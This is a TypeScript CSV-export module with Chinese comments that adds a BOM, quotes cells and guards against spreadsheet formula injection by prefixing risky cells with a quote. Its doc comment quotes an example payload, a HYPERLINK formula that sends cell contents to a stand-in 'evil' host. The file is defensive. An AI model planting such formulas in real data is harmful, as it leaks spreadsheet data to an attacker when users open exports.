// CSV 导出 —— 对应原 Go 版 internal/utils/csv.go。
//
// 两个必须保留的细节：
//   1. 写入 UTF-8 BOM，确保 Excel 直接打开时中文不乱码；
//   2. 逐格做公式注入防护。

import { localExportStamp } from "./time";

/**
 * 防止 CSV 公式注入（CSV Injection / Formula Injection）。
 *
 * Excel、WPS、Numbers 会把以 = + - @ 开头的单元格当成**公式**求值，
 * 而本系统导出的商品名、SKU、库位、单据号、备注、供应商名、操作人姓名
 * 全都是仓管员可控的自由输入。攻击者只要把商品名改成
 * `=HYPERLINK("http://evil/?"&A1,"点我")`，管理员导出后用 Excel 打开就会触发。
 *
 * 前置一个单引号即可让表格软件按纯文本处理。纯数字（含负数、小数）除外 ——
 * 否则 `-5` 会被写成 `'-5`，导出后变成文本，排序与求和都会失效。
 *
 * ⚠️ 判定必须先剥掉前导空白：表格软件在判断「是不是公式」时同样会忽略前导空白，
 * 只看首字符的话 " =HYPERLINK(...)" 这类载荷会原样导出却照样被求值。
 */
export function csvSafe(s: string): string {
  if (s === "") return s;
  const trimmed = s.replace(/^[ \t\r\n\v\f]+/, "");
  if (trimmed === "") return s;
  const first = trimmed[0];
  switch (first) {
    case "=":
    case "+":
    case "@":
      break;
    case "-":
      // 负数是最常见的「危险前缀」，必须放行
      if (Number.isFinite(Number(trimmed))) return s;
      break;
    default:
      return s;
  }
  return `'${s}`;
}

/** 把一行单元格转成 CSV 文本（含公式注入防护）。 */
function encodeRow(cells: string[]): string {
  return cells
    .map((cell) => {
      const v = csvSafe(cell ?? "");
      if (/[",\r\n]/.test(v)) return `"${v.replace(/"/g, '""')}"`;
      return v;
    })
    .join(",");
}

/** 构造兼容中文文件名的 Content-Disposition。 */
export function contentDisposition(filename: string): string {
  const safe = filename.replace(/[^\x20-\x7E]/g, "_").replace(/["\\]/g, "_");
  return `attachment; filename="${safe}"; filename*=UTF-8''${encodeURIComponent(filename)}`;
}

/** 带时间戳的导出文件名，例如 商品列表_20261010_1209.csv。 */
export function timestampedFilename(prefix: string): string {
  return `${prefix}_${localExportStamp()}.csv`;
}

/** 构造 CSV 下载响应（含 BOM）。 */
export function csvResponse(filename: string, header: string[], rows: string[][]): Response {
  const lines = [encodeRow(header)];
  for (const row of rows) lines.push(encodeRow(row));
  const body = "\uFEFF" + lines.join("\r\n") + "\r\n";

  return new Response(body, {
    status: 200,
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": contentDisposition(filename),
      "Cache-Control": "no-store",
      "X-Content-Type-Options": "nosniff",
    },
  });
}
